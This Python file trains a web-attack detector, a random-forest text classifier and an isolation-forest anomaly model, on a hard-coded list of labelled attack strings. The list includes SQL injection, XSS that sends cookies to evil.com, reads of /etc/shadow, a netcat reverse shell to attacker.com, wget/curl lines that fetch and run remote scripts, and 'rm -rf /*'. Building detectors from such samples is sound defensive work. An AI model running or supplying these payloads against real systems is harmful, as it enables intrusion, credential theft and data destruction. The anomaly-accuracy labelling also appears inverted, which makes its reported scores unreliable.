import pandas as pd
import numpy as np
import pickle
import json
import logging
from datetime import datetime
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
import warnings
warnings.filterwarnings('ignore')

class MasterThreatModel:
    def __init__(self):
        self.setup_logging()
        self.text_model = None
        self.vectorizer = None
        self.anomaly_model = None
        self.scaler = None
        self.is_trained = False
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - MASTER_MODEL - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
    
    def generate_training_data(self):
        """Generate comprehensive training data for threat detection"""
        self.logger.info("📊 Generating Comprehensive Training Data")
        
        # Enhanced attack patterns with more variations
        # attack_patterns = {
        #     'sql_injection': [
        #         "' OR '1'='1'--", "admin'--", "' OR 1=1--", "'; DROP TABLE users--",
        #         "' UNION SELECT null--", "' AND 1=1--", "1' ORDER BY 1--",
        #         "' OR 'a'='a", "admin'/*", "' OR EXISTS(SELECT * FROM users)--",
        #         "1; DROP TABLE products--", "' OR SLEEP(5)--", "' AND 1=CONVERT(int,@@version)--"
        #     ],
        #     'xss': [
        #         "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
        #         "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
        #         "<iframe src=javascript:alert('XSS')>", "<input onfocus=alert(1) autofocus>",
        #         "<marquee onstart=alert('XSS')>", "<div onmouseover=alert('XSS')>",
        #         "javascript:alert('XSS')", "<a href=javascript:alert('XSS')>click</a>",
        #         "<embed src=javascript:alert('XSS')>", "<object data=javascript:alert('XSS')>"
        #     ],
        #     'path_traversal': [
        #         "../../../etc/passwd", "../../../../windows/win.ini",
        #         "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        #         "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        #         "....\\....\\....\\windows\\win.ini", "/etc/passwd%00",
        #         "..%255c..%255c..%255cwindows%255cwin.ini", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        #     ],
        #     'command_injection': [
        #         "; ls -la", "| cat /etc/passwd", "& whoami", "`id`",
        #         "$(cat /etc/passwd)", "|| ping -c 5 localhost", "&& netstat -an",
        #         "; systeminfo", "| dir C:\\", "& type C:\\windows\\win.ini"
        #     ],
        #     'normal': [
        #         "apple", "banana", "orange juice", "fresh fruits", "organic products",
        #         "user login", "product search", "customer feedback", "shopping cart",
        #         "password reset", "email verification", "order confirmation",
        #         "product details", "user registration", "payment processing",
        #         "delivery information", "customer support", "return policy"
        #     ]
        # }
        
        
        attack_patterns = {
            'sql_injection': [
                "' OR '1'='1'--", "admin'--", "' OR 1=1--", "'; DROP TABLE users--",
                "' UNION SELECT null--", "' AND 1=1--", "1' ORDER BY 1--",
                "' OR 'a'='a", "admin'/*", "' OR EXISTS(SELECT * FROM users)--",
                "1; DROP TABLE products--", "' OR SLEEP(5)--", "' AND 1=CONVERT(int,@@version)--",
                "' UNION SELECT username, password FROM users--",  # Classic for stealing data
                "' AND 1=1 UNION SELECT null, username, password FROM users--",  # Bypass login
                "' OR 1=1 AND UPDATE users SET password='12345'--",  # Blind SQL Injection
                "1' AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns--",  # Enumerating database tables
                "' OR 1=1 LIMIT 1,1--",  # Offsetting queries
                "'; EXEC xp_cmdshell('dir')--",  # Windows SQL Injection
                "' OR 1=1; SELECT * FROM system_users--"  # For detecting system user data
            ],
            'xss': [
                "<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>",
                "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>", "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert('XSS')>", "<div onmouseover=alert('XSS')>",
                "javascript:alert('XSS')", "<a href=javascript:alert('XSS')>click</a>",
                "<embed src=javascript:alert('XSS')>", "<object data=javascript:alert('XSS')>",
                "<script>eval('alert(\"XSS\")')</script>",  # Eval based XSS
                "<img src='http://example.com/xss?param=<script>alert(1)</script>'>",  # Reflected XSS
                "<input type='text' oninput='fetch(\"/malicious?payload=<script>evil()</script>\")'>",  # XSS with input event
                "<style>body{background:url(javascript:alert(1))}</style>",  # XSS in CSS
                "<iframe src='http://evil.com'></iframe>",  # Embedding malicious iframe
                "<script>document.location='http://evil.com?' + document.cookie;</script>",  # Stealing cookies
                "<form action='http://evil.com'><input type='submit' value='Submit'></form>"  # XSS in forms
            ],
            'path_traversal': [
                "../../../etc/passwd", "../../../../windows/win.ini",
                "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....\\....\\....\\windows\\win.ini", "/etc/passwd%00",
                "..%255c..%255c..%255cwindows%255cwin.ini", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "/home/user/../../../etc/shadow",  # Linux shadow file
                "/../../../var/www/html/index.php",  # Exploit hidden files in web server
                "..\\..\\..\\..\\Program Files\\confidential\\file.txt",  # Windows file access
                "..\\..\\..\\..\\Windows\\System32\\calc.exe",  # Accessing Windows executables
                "....//....//....//var/log/auth.log",  # Accessing auth logs (sensitive files)
                "%2e%2e%2f%2e%2e%2fetc%2fshadow%00",  # Null byte injection in path traversal
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd%255c"  # Escaping for more advanced traversal
            ],
            'command_injection': [
                "; ls -la", "| cat /etc/passwd", "& whoami", "`id`",
                "$(cat /etc/passwd)", "|| ping -c 5 localhost", "&& netstat -an",
                "; systeminfo", "| dir C:\\", "& type C:\\windows\\win.ini",
                "`curl -X GET http://malicious.com -o /dev/null`",  # Remote code execution via curl
                "| nc -e /bin/sh attacker.com 1234",  # Reverse shell
                "; wget http://malicious.com/malware.sh -O /tmp/malware.sh && sh /tmp/malware.sh",  # Download and execute malware
                "ping -c 1 127.0.0.1 && rm -rf /important/data",  # Test ping and dangerous command execution
                "; rm -rf /*",  # Deleting files via command injection
                "`netstat -ant`",  # List open network connections
                "echo $(curl http://evil.com/malicious_script.sh) | bash",  # Inject remote shell script
                "cmd.exe /C echo %0 > C:\\Windows\\System32\\inetsrv\\myevilfile.bat"  # Windows command injection
            ],
            'normal': [
                "apple", "banana", "orange juice", "fresh fruits", "organic products",
                "user login", "product search", "customer feedback", "shopping cart",
                "password reset", "email verification", "order confirmation",
                "product details", "user registration", "payment processing",
                "delivery information", "customer support", "return policy",
                "account settings", "privacy policy", "contact us", "terms of service",
                "user dashboard", "subscription plans", "help center", "faq",
                "order history", "checkout page", "shipping address"
            ]
        }
        

        # Create labeled dataset
        training_data = []
        for label, patterns in attack_patterns.items():
            for pattern in patterns:
                training_data.append({
                    'text': pattern,
                    'label': label,
                    'is_malicious': 1 if label != 'normal' else 0
                })
        
        return pd.DataFrame(training_data)
    
    def generate_anomaly_training_data(self):
        """Generate numerical data for anomaly detection"""
        np.random.seed(42)
        
        # Normal traffic patterns
        normal_data = {
            'request_size': np.random.normal(1500, 300, 2000),
            'response_time': np.random.normal(0.5, 0.2, 2000),
            'requests_per_minute': np.random.poisson(15, 2000),
            'error_rate': np.random.beta(2, 50, 2000),
            'unique_endpoints': np.random.randint(5, 25, 2000),
            'payload_length': np.random.normal(200, 50, 2000)
        }
        
        # Attack traffic patterns
        attack_data = {
            'request_size': np.concatenate([
                np.random.normal(5000, 1000, 200),  # Data exfiltration
                np.random.normal(100, 20, 200)      # Probing attacks
            ]),
            'response_time': np.concatenate([
                np.random.normal(2.0, 1.0, 200),    # Slow attacks
                np.random.normal(0.1, 0.05, 200)    # Fast flooding
            ]),
            'requests_per_minute': np.concatenate([
                np.random.poisson(100, 200),        # High rate attacks
                np.random.poisson(2, 200)           # Low and slow attacks
            ]),
            'error_rate': np.concatenate([
                np.random.beta(10, 5, 200),         # High error attacks
                np.random.beta(1, 20, 200)          # Stealthy attacks
            ]),
            'unique_endpoints': np.concatenate([
                np.random.randint(1, 5, 200),       # Targeted attacks
                np.random.randint(30, 50, 200)      # Reconnaissance
            ]),
            'payload_length': np.concatenate([
                np.random.normal(5000, 1000, 200),  # Large payloads
                np.random.normal(50, 10, 200)       # Small malicious payloads
            ])
        }
        
        normal_df = pd.DataFrame(normal_data)
        normal_df['label'] = 'normal'
        normal_df['is_anomaly'] = 0
        
        attack_df = pd.DataFrame(attack_data)
        attack_df['label'] = 'attack'
        attack_df['is_anomaly'] = 1
        
        combined_df = pd.concat([normal_df, attack_df], ignore_index=True)
        return combined_df
    
    def train_text_classifier(self, text_data):
        """Train text-based threat classification model"""
        self.logger.info("🤖 Training Text Threat Classification Model")
        
        # Prepare features and labels
        X_text = text_data['text']
        y_text = text_data['label']
        
        # Create TF-IDF features
        self.vectorizer = TfidfVectorizer(
            max_features=2000,
            stop_words='english',
            ngram_range=(1, 3),
            analyzer='char_wb',
            min_df=2,
            max_df=0.8
        )
        
        X_features = self.vectorizer.fit_transform(X_text)
        
        # Train Random Forest classifier
        self.text_model = RandomForestClassifier(
            n_estimators=200,
            max_depth=15,
            min_samples_split=5,
            min_samples_leaf=2,
            class_weight='balanced',
            random_state=42,
            n_jobs=-1
        )
        
        # Split data for validation
        X_train, X_test, y_train, y_test = train_test_split(
            X_features, y_text, test_size=0.2, random_state=42, stratify=y_text
        )
        
        # Train model
        self.text_model.fit(X_train, y_train)
        
        # Evaluate
        train_accuracy = self.text_model.score(X_train, y_train)
        test_accuracy = self.text_model.score(X_test, y_test)
        
        self.logger.info(f"✅ Text Model - Train Accuracy: {train_accuracy:.3f}, Test Accuracy: {test_accuracy:.3f}")
        
        # Detailed classification report
        y_pred = self.text_model.predict(X_test)
        self.logger.info(f"📊 Classification Report:\n{classification_report(y_test, y_pred)}")
        
        return train_accuracy, test_accuracy
    
    def train_anomaly_detector(self, anomaly_data):
        """Train anomaly detection model for numerical features"""
        self.logger.info("🔍 Training Anomaly Detection Model")
        
        # Prepare features
        feature_columns = ['request_size', 'response_time', 'requests_per_minute', 
                         'error_rate', 'unique_endpoints', 'payload_length']
        X_anomaly = anomaly_data[feature_columns]
        y_anomaly = anomaly_data['is_anomaly']
        
        # Scale features
        self.scaler = StandardScaler()
        X_scaled = self.scaler.fit_transform(X_anomaly)
        
        # Train Isolation Forest
        self.anomaly_model = IsolationForest(
            contamination=0.1,
            n_estimators=150,
            max_samples='auto',
            random_state=42,
            n_jobs=-1
        )
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X_scaled, y_anomaly, test_size=0.2, random_state=42, stratify=y_anomaly
        )
        
        # Train model
        self.anomaly_model.fit(X_train)
        
        # Evaluate
        train_scores = self.anomaly_model.decision_function(X_train)
        test_scores = self.anomaly_model.decision_function(X_test)
        
        # Convert to binary predictions (1 for normal, -1 for anomaly)
        train_pred = self.anomaly_model.predict(X_train)
        test_pred = self.anomaly_model.predict(X_test)
        
        # Convert to 0/1 for accuracy calculation
        train_pred_binary = (train_pred == 1).astype(int)
        test_pred_binary = (test_pred == 1).astype(int)
        
        train_accuracy = accuracy_score(y_train, train_pred_binary)
        test_accuracy = accuracy_score(y_test, test_pred_binary)
        
        self.logger.info(f"✅ Anomaly Model - Train Accuracy: {train_accuracy:.3f}, Test Accuracy: {test_accuracy:.3f}")
        
        return train_accuracy, test_accuracy
    
    def train_complete_model(self):
        """Train both text classification and anomaly detection models"""
        self.logger.info("🚀 Starting Complete Model Training")
        
        # Generate training data
        text_data = self.generate_training_data()
        anomaly_data = self.generate_anomaly_training_data()
        
        # Train models
        text_train_acc, text_test_acc = self.train_text_classifier(text_data)
        anomaly_train_acc, anomaly_test_acc = self.train_anomaly_detector(anomaly_data)
        
        # Set trained flag
        self.is_trained = True
        
        # Save performance metrics
        self.performance_metrics = {
            'text_classifier': {
                'train_accuracy': text_train_acc,
                'test_accuracy': text_test_acc,
                'classes': list(self.text_model.classes_)
            },
            'anomaly_detector': {
                'train_accuracy': anomaly_train_acc,
                'test_accuracy': anomaly_test_acc
            },
            'training_date': datetime.now().isoformat(),
            'model_versions': {
                'text_model': 'RandomForest',
                'anomaly_model': 'IsolationForest',
                'vectorizer': 'TF-IDF'
            }
        }
        
        self.logger.info("🎯 Complete Model Training Finished")
        return self.performance_metrics
    
    def predict_threat(self, input_text):
        """Predict threat type for input text"""
        if not self.is_trained:
            raise ValueError("Model not trained. Call train_complete_model() first.")
        
        # Transform input text
        features = self.vectorizer.transform([input_text])
        
        # Get prediction and probabilities
        prediction = self.text_model.predict(features)[0]
        probabilities = self.text_model.predict_proba(features)[0]
        
        # Get confidence score
        confidence = max(probabilities)
        
        # Determine threat level
        threat_levels = {
            'normal': 'LOW',
            'sql_injection': 'CRITICAL',
            'xss': 'HIGH', 
            'path_traversal': 'HIGH',
            'command_injection': 'CRITICAL'
        }
        
        return {
            'input': input_text,
            'prediction': prediction,
            'confidence': confidence,
            'threat_level': threat_levels.get(prediction, 'MEDIUM'),
            'probabilities': dict(zip(self.text_model.classes_, probabilities)),
            'is_malicious': prediction != 'normal'
        }
    
    def detect_anomaly(self, features_dict):
        """Detect anomalies in numerical features"""
        if not self.is_trained:
            raise ValueError("Model not trained. Call train_complete_model() first.")
        
        # Convert features to array
        feature_columns = ['request_size', 'response_time', 'requests_per_minute', 
                         'error_rate', 'unique_endpoints', 'payload_length']
        
        features_array = np.array([[features_dict.get(col, 0) for col in feature_columns]])
        
        # Scale features
        features_scaled = self.scaler.transform(features_array)
        
        # Get anomaly score and prediction
        anomaly_score = self.anomaly_model.decision_function(features_scaled)[0]
        is_anomaly = self.anomaly_model.predict(features_scaled)[0] == -1
        
        # Convert score to probability-like value
        anomaly_confidence = 1 / (1 + np.exp(-anomaly_score))
        
        return {
            'is_anomaly': bool(is_anomaly),
            'anomaly_score': anomaly_score,
            'confidence': anomaly_confidence,
            'threat_level': 'HIGH' if is_anomaly else 'LOW'
        }
    
    def save_model(self, filepath='../models/master_threat_model.pkl'):
        """Save complete model to pickle file"""
        import os
        os.makedirs('../models', exist_ok=True)
        
        model_data = {
            'text_model': self.text_model,
            'vectorizer': self.vectorizer,
            'anomaly_model': self.anomaly_model,
            'scaler': self.scaler,
            'performance_metrics': self.performance_metrics,
            'is_trained': self.is_trained,
            'save_date': datetime.now().isoformat()
        }
        
        with open(filepath, 'wb') as f:
            pickle.dump(model_data, f)
        
        self.logger.info(f"💾 Model saved to: {filepath}")
        
        # Also save individual components for flexibility
        individual_files = {
            'text_model.pkl': self.text_model,
            'vectorizer.pkl': self.vectorizer,
            'anomaly_model.pkl': self.anomaly_model,
            'scaler.pkl': self.scaler
        }
        
        for filename, component in individual_files.items():
            with open(f'../models/{filename}', 'wb') as f:
                pickle.dump(component, f)
        
        self.logger.info("💾 Individual model components saved")
        
        return filepath
    
    def load_model(self, filepath='../models/master_threat_model.pkl'):
        """Load model from pickle file"""
        try:
            with open(filepath, 'rb') as f:
                model_data = pickle.load(f)
            
            self.text_model = model_data['text_model']
            self.vectorizer = model_data['vectorizer']
            self.anomaly_model = model_data['anomaly_model']
            self.scaler = model_data['scaler']
            self.performance_metrics = model_data.get('performance_metrics', {})
            self.is_trained = model_data.get('is_trained', False)
            
            self.logger.info(f"📂 Model loaded from: {filepath}")
            self.logger.info(f"📊 Model performance: {self.performance_metrics}")
            
            return True
        except Exception as e:
            self.logger.error(f"❌ Error loading model: {e}")
            return False
    
    def real_time_detection_demo(self, test_inputs):
        """Demo real-time threat detection"""
        self.logger.info("🎯 Starting Real-time Threat Detection Demo")
        
        results = []
        
        for input_text in test_inputs:
            # Text threat detection
            threat_result = self.predict_threat(input_text)
            
            # Simulate numerical features for anomaly detection
            simulated_features = {
                'request_size': len(input_text) * 10,
                'response_time': 0.5 if threat_result['is_malicious'] else 0.1,
                'requests_per_minute': 100 if threat_result['is_malicious'] else 10,
                'error_rate': 0.8 if threat_result['is_malicious'] else 0.1,
                'unique_endpoints': 2 if threat_result['is_malicious'] else 15,
                'payload_length': len(input_text)
            }
            
            anomaly_result = self.detect_anomaly(simulated_features)
            
            combined_result = {
                'input': input_text,
                'threat_detection': threat_result,
                'anomaly_detection': anomaly_result,
                'overall_threat_level': threat_result['threat_level'] if threat_result['threat_level'] != 'LOW' else anomaly_result['threat_level']
            }
            
            results.append(combined_result)
        
        return results

def train_and_save_model():
    """Function to train and save the model once"""
    model = MasterThreatModel()
    
    print("🚀 Training Master Threat Detection Model...")
    print("This might take 1-2 minutes...")
    
    # Train the model
    performance = model.train_complete_model()
    
    # Save the model
    model_path = model.save_model()
    
    # Generate demo report
    demo_results = model.real_time_detection_demo([
        "normal search query",
        "' OR 1=1--",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "; ls -la"
    ])
    
    # Save demo results
    with open('../reports/model_demo_results.json', 'w') as f:
        json.dump({
            'performance_metrics': performance,
            'demo_results': demo_results,
            'training_date': datetime.now().isoformat()
        }, f, indent=2)
    
    print(f"\n✅ Model trained and saved to: {model_path}")
    print("📊 Performance Metrics:")
    print(f"   Text Classifier - Test Accuracy: {performance['text_classifier']['test_accuracy']:.3f}")
    print(f"   Anomaly Detector - Test Accuracy: {performance['anomaly_detector']['test_accuracy']:.3f}")
    
    print("\n🎯 Demo Results:")
    for result in demo_results:
        status = "🚨 MALICIOUS" if result['threat_detection']['is_malicious'] else "✅ NORMAL"
        print(f"{status}: {result['input'][:50]}...")
        print(f"   Threat: {result['threat_detection']['prediction']} | Confidence: {result['threat_detection']['confidence']:.3f}")
    
    return model

def load_and_use_model():
    """Function to load and use pre-trained model"""
    model = MasterThreatModel()
    
    if model.load_model():
        print("✅ Model loaded successfully!")
        print("🤖 Ready for real-time threat detection")
        return model
    else:
        print("❌ No pre-trained model found. Please train the model first.")
        return None

if __name__ == "__main__":
    # Train and save the model (run this once)
    model = train_and_save_model()